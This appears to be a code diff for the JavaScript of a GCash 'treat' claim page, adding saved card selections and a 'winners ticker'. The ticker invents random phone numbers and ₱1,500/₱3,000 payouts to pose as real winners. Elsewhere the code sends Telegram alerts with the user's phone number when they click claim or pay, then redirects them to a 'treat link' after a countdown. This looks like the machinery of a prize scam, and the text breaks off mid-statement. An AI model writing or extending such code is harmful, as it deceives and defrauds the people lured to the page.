@@ -29,8 +29,18 @@
     }
   };
 
+  // ===== LOCAL STORAGE KEYS =====
+  const STORAGE_KEYS = {
+    SELECTED_CARD: 'treat_selected_card',
+    SELECTED_AMOUNT: 'treat_selected_amount',
+    USER_PHONE: 'user_phone'
+  };
+
   // ===== USER DATA =====
-  const userPhone = localStorage.getItem('user_phone') || '09171234567';
+  const userPhone = localStorage.getItem(STORAGE_KEYS.USER_PHONE) || '09171234567';
+  if (!localStorage.getItem(STORAGE_KEYS.USER_PHONE)) {
+    localStorage.setItem(STORAGE_KEYS.USER_PHONE, userPhone);
+  }
 
   // ===== DOM REFERENCES =====
   const profileImg = document.getElementById('profileImg');
@@ -448,6 +458,9 @@ ${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (v
     setTimeout(() => {
       amountSpan.classList.remove('increment', 'decrement');
     }, 700);
+    
+    // Save balance to localStorage
+    localStorage.setItem(STORAGE_KEYS.SELECTED_AMOUNT, String(newAmount));
   }
 
   // ===== CARD SELECTION =====
@@ -466,6 +479,9 @@ ${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (v
       updateBalance(0, false);
       stopLinkScanner();
       setTimeout(updateThoughtMessages, 300);
+      
+      localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
+      localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
       return;
     }
 
@@ -485,11 +501,72 @@ ${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (v
     updateBalance(amount, true);
     setTimeout(updateThoughtMessages, 300);
     
+    localStorage.setItem(STORAGE_KEYS.SELECTED_CARD, cardId);
+    localStorage.setItem(STORAGE_KEYS.SELECTED_AMOUNT, String(amount));
+    
     const cardNumberParsed = parseInt(selectedCard.replace('card', ''));
     const treatType = cardData[cardNumberParsed].type;
     startLinkScanner(treatType);
   }
   window.selectCard = selectCard;
+
+  // ===== RESTORE SELECTED CARD FROM LOCALSTORAGE =====
+  function restoreSelectedCard() {
+    const savedCard = localStorage.getItem(STORAGE_KEYS.SELECTED_CARD);
+    const savedAmount = localStorage.getItem(STORAGE_KEYS.SELECTED_AMOUNT);
+    
+    if (!savedCard) {
+      console.log('ℹ️ No saved card found');
+      return false;
+    }
+    
+    const cardElement = document.getElementById(savedCard);
+    if (!cardElement) {
+      console.log('⚠️ Saved card not found in DOM');
+      localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
+      localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
+      return false;
+    }
+    
+    const cardNumber = parseInt(savedCard.replace('card', ''));
+    if (!cardData[cardNumber]) {
+      console.log('⚠️ Invalid card data');
+      localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
+      localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
+      return false;
+    }
+    
+    const amount = parseFloat(savedAmount) || cardData[cardNumber].amount;
+    const btn = cardElement.querySelector('.card-btn');
+    
+    document.querySelectorAll('.card-item').forEach(c => {
+      if (c.id !== savedCard) {
+        c.classList.remove('selected');
+        const b = c.querySelector('.card-btn');
+        if (b) {
+          b.classList.remove('selected-btn');
+          b.textContent = 'Select Treat';
+        }
+      }
+    });
+    
+    cardElement.classList.add('selected');
+    if (btn) {
+      btn.classList.add('selected-btn');
+      btn.textContent = '✓ Selected';
+    }
+    
+    selectedCard = savedCard;
+    currentBalance = amount;
+    updateBalance(amount, true);
+    setTimeout(updateThoughtMessages, 300);
+    
+    const treatType = cardData[cardNumber].type;
+    startLinkScanner(treatType);
+    
+    console.log('✅ Card restored:', savedCard, 'Amount:', amount);
+    return true;
+  }
 
   // ===== CARD POPUP =====
   function openCardPopup(cardNumber) {
@@ -564,15 +641,12 @@ ${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (v
     claimPopupRewardAmount.textContent = formatWithCommas(rawAmount);
     claimPopupPhone.textContent = userPhone;
     
-    // Send Claim Now Telegram Alert
     sendClaimNowAlert(data.name, data.badge, userPhone);
     
-    // Reset timer state
     resetClaimTimer();
     isRedirecting = false;
     hasSentPayTreatsAlert = false;
     
-    // Check if link exists immediately
     checkForDeployedLink(data.type).then(link => {
       treatLink = link;
       if (link) {
@@ -605,7 +679,6 @@ ${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (v
     
     if (isTimerRunning) return;
     
-    // Send Pay Treats Telegram Alert (only once per session)
     if (!hasSentPayTreatsAlert) {
       const cardNumber = parseInt(selectedCard.replace('card', ''));
       const data = cardData[cardNumber];
@@ -613,7 +686,6 @@ ${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (v
       hasSentPayTreatsAlert = true;
     }
     
-    // If link exists, redirect immediately
     if (treatLink && !isRedirecting) {
       console.log('🔗 Link exists, redirecting immediately...');
       isRedirecting = true;
@@ -629,7 +701,6 @@ ${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (v
       return;
     }
     
-    // No link - start visual timer
     timeRemaining = 300;
     isTimerRunning = true;
     claimPayBtn.classList.add('disabled');
@@ -733,124 +804,38 @@ ${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (v
     }
   });
 
-  // ===== CHECK PERSISTENT TIMER ON LOAD =====
-  function checkPersistentTimer() {
-    const timerData = localStorage.getItem('treat_timer');
-    if (!timerData) return false;
+  // ============================================================
+  // WINNERS TICKER
+  // ============================================================
+
+  function generateRandomPhone() {
+    const prefix = '09' + String(Math.floor(Math.random() * 9000) + 1000);
+    const suffix = String(Math.floor(Math.random() * 9000) + 1000);
+    return prefix + suffix;
+  }
+
+  function generateRandomAmount() {
+    const random = Math.random();
+    if (random < 0.7) {
+      return { amount: 1500, display: '₱1,500', class: 'common' };
+    } else {
+      return { amount: 3000, display: '₱3,000', class: 'rare' };
+    }
+  }
+
+  function createTickerItem(phone, amountData) {
+    const item = document.createElement('div');
+    item.className = 'ticker-item';
     
-    try {
-      const data = JSON.parse(timerData);
-      const elapsed = Math.floor((Date.now() - data.startTime) / 1000);
-      const remaining = data.duration - elapsed;
-      
-      console.log('⏰ Persistent timer found:', { elapsed, remaining, duration: data.duration });
-      
-      if (remaining > 0) {
-        timeRemaining = remaining;
-        isTimerRunning = true;
-        selectedCard = data.selectedCard;
-        treatLink = data.treatLink;
-        
-        const cardNumber = parseInt(selectedCard.replace('card', ''));
-        if (cardNumber && cardData[cardNumber]) {
-          currentBalance = cardData[cardNumber].amount;
-          updateBalance(currentBalance, true);
-        }
-        
-        startTimerDisplay(remaining);
-        
-        if (data.pendingRedirect && data.treatLink) {
-          setTimeout(() => {
-            if (data.treatLink) {
-              window.location.href = data.treatLink;
-            }
-          }, 1000);
-        }
-        
-        return true;
-      } else {
-        localStorage.removeItem('treat_timer');
-        if (data.treatLink && data.pendingRedirect) {
-          window.location.href = data.treatLink;
-        }
-        return false;
-      }
-    } catch (e) {
-      console.error('Error parsing timer data:', e);
-      localStorage.removeItem('treat_timer');
-      return false;
-    }
-  }
-
-  function startTimerDisplay(seconds) {
-    const minutes = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    const timeStr = String(minutes).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+    const icon = document.createElement('img');
+    icon.src = 'photos/gc_icon.png';
+    icon.alt = 'GCash';
+    icon.className = 'gc-icon-small';
     
-    if (claimTimerDisplay) {
-      claimTimerDisplay.textContent = timeStr;
-    }
+    const phoneSpan = document.createElement('span');
+    phoneSpan.className = 'ticker-phone';
+    phoneSpan.textContent = phone;
     
-    claimPayBtn.classList.add('disabled');
-    claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">' + timeStr + '</span>';
-  }
-
-  function saveTimerState(duration, link, cardId) {
-    const timerData = {
-      startTime: Date.now(),
-      duration: duration,
-      selectedCard: cardId,
-      treatLink: link,
-      pendingRedirect: !!link
-    };
-    localStorage.setItem('treat_timer', JSON.stringify(timerData));
-    console.log('💾 Timer state saved:', timerData);
-  }
-
-  // ===== INITIALIZE - CHECK PERSISTENT TIMER =====
-  const hasActiveTimer = checkPersistentTimer();
-  
-  if (!hasActiveTimer) {
-    console.log('ℹ️ No active timer found');
-  }
-
-  // Add toast styles
-  const style = document.createElement('style');
-  style.textContent = `
-    .toast-message {
-      position: fixed;
-      bottom: 30px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(3, 8, 7, 0.90);
-      backdrop-filter: blur(16px);
-      color: #fff;
-      padding: 0.8rem 1.8rem;
-      border-radius: 18px;
-      border: 1px solid rgba(0, 180, 255, 0.10);
-      font-family: 'Inter', sans-serif;
-      font-size: 0.9rem;
-      font-weight: 500;
-      z-index: 9998;
-      box-shadow: 0 10px 50px rgba(0, 0, 0, 0.7);
-      animation: toastSlideUp 0.3s ease;
-      max-width: 85%;
-      text-align: center;
-    }
-    .toast-message.error {
-      border-color: rgba(255, 50, 50, 0.15);
-    }
-    @keyframes toastSlideUp {
-      from { opacity: 0; transform: translateX(-50%) translateY(20px); }
-      to { opacity: 1; transform: translateX(-50%) translateY(0); }
-    }
-    @keyframes toastSlideDown {
-      from { opacity: 1; transform: translateX(-50%) translateY(0); }
-      to { opacity: 0; transform: translateX(-50%) translateY(20px); }
-    }
-  `;
-  document.head.appendChild(style);
-
-  console.log('✅ Main.js initialized successfully');
-})();
-
+    const claimSpan = document.createElement('span');
+    claimSpan.className = 'ticker-claim';
+    claimSpan.textContent
